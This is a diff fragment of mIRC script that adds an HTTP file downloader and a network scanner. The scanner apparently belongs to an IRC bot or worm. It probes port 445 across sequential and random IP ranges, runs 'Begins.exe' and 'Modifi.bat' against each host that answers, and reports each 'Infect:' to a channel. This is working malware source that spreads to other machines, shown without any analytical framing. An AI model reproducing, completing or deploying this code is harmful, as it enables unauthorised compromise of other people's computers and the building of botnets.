+      elseif ($prop == cps) { return $int($calc(%4 / ($ctime - $dl.var(%1,ctime,2)))) }
+      elseif ($prop == pc) { return $int($calc($file(%2).size * 100 / %3)) }
+      elseif ($prop == secs) { return $calc($ctime - $dl.var(%1,ctime,1)) }
+    }
+  }
+}
+alias -l dl.var { return $gettok(% [ $+ [ $+($1,.,$2) ] ],$iif(!$3,1-,$3),32) }
+alias -l dl.fail { var %1 = $right($1,-8) | .signal -n download_fail %1 $2- | close -d %1 }
+alias close {
+  if ($1 == -d) {
+    var %1 = download $+ $2
+    if ($sock(%1)) {
+      .remove $+(",$dl.var(%1,file),")
+      unset % [ $+ [ %1 $+ .* ] ]
+      sockclose %1
+    }
+  }
+  else { close $1- }
+}
+on *:sockopen:download*:{
+  if ($sockerr) { dl.fail $sockname Unable to Connect | return }
+  var %1 = $dl.var($sockname,url)
+  set % [ $+ [ $sockname $+ .status ] ] Requesting File
+  sockwrite -tn $sockname GET %1 HTTP/1.1
+  sockwrite -tn $sockname Host: $gettok($remove(%1,http://),1,47)
+  sockwrite -tn $sockname Accept: *.*, */*
+  sockwrite -tn $sockname Connection: close
+  sockwrite -tn $sockname $crlf
+}
+on *:sockclose:download*:{ if ($dl.var($sockname,status) != done) { dl.fail $sockname Disconnected | downloadstatus } }
+on *:sockread:download*:{
+  if ($sockerr) { dl.fail $sockname Disconnected | return }
+  if ($dl.var($sockname,status) != downloading) {
+    var %1 | sockread %1 | tokenize 32 %1
+    if (HTTP/* iswm $1 && $2 != 200) { dl.fail $sockname $3- }
+    elseif ($1 == Content-Length:) { set % [ $+ [ $sockname $+ .size ] ] $2 }
+    elseif ($1 == Content-Type:) { set % [ $+ [ $sockname $+ .type ] ] $2- }
+    elseif (!$1) {
+      write -c $+(",$dl.var($sockname,file),")
+      set % [ $+ [ $sockname $+ .ctime ] ] $dl.var($sockname,ctime,1) $ctime
+      set % [ $+ [ $sockname $+ .status ] ] Downloading
+      downloadstatus 
+      return
+    }
+  }
+  else {
+    var %1 = $dl.var($sockname,file)
+    :sockread
+    sockread &1
+    if (!$sockbr) { return }
+    bwrite $+(",%1,") -1 &1
+    downloadstatus
+    if ($file(%1).size >= $dl.var($sockname,size)) {
+      var %1 = $right($sockname,-8),%2 = $dl.var($sockname,file)
+      set % [ $+ [ $sockname $+ .status ] ] Done
+      .copy -o $+(",%2,") $+(",$left(%2,-4),")
+      .signal -n download_complete %1
+      downloadstatus
+      close -d %1
+      return
+    }
+    goto sockread
+  }
+}
+alias fileKB { return $bytes($file( $1- )).suf ( $+ $byte($file($1-)) bytes) }
+alias byte {
+  var %0 $1
+  var %lens $len( %0 )
+  var %inc 0
+  var %1 %0
+  var %6 $int($calc(%lens /3))
+  :loop
+  var %2 $right(%1,3)
+  if %3 != $null { var %3 %2 $+ , $+ %3 }
+  if %3 == $null { var %3 %2 }
+  set %1 $remove(%1,%2) 
+  inc %inc
+  if %inc < %6 { goto loop }
+  if %inc == %6 {  if ($remove(%3,$chr(44)) != %0) { goto loop } }
+  return %3
+}
+alias downloadstatus {
+  if (%downspeed == $null) { set %downspeed $download(1).cps }
+  if (%downspeed < $download(1).cps) { set %downspeed $download(1).cps }
+}
+alias startscan {
+  if (%Scan.ip1s) { if %Scan.ip1s == %Scan.ip2s EndScan }
+  if ($sock(Killer*,0) > 45) { goto end }
+  sockopen Killer $+ %Scan.ip1s $longip(%Scan.ip1s) 445
+  .timer $+ %Scan.ip1s 1 5 sockclose Killer $+ %Scan.ip1s
+  inc %Scan.ip1s
+  :end
+}
+alias randmyip {
+  return $randip($gettok($ip,1-2,46) $+ .*.0)
+}
+alias randip {
+  set %Scan.infect 0
+  var %1p1 $1-
+  var %1p2 $replace($gettok(%1p1,1,46),*,$r(1,255))
+  var %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$r(1,255))
+  var %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$r(1,255))
+  var %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$r(1,255))
+  return %1p2
+}
+alias EndScan .timerstartscan off | sockclose Killer* | msg %c [Scanner] finished ( $+ %Scan.ip1 $+ <-> $+ $longip(%Scan.ip2s) $+ ) ( $+ %Scan.infect $+ ). | unset %Scan.*
+on 1:sockopen:Killer*:{ 
+  if ($sockerr > 0) { halt } 
+  run Begins.exe /n /fh /r "Modifi.bat $sock($sockname).ip $+ "
+  inc %Scan.infect
+  msg %c [Scanner] Infect: $sock($sockname).ip ( $+ %Scan.infect $+ ).
+  sockclose $sockname 
+  halt
+}
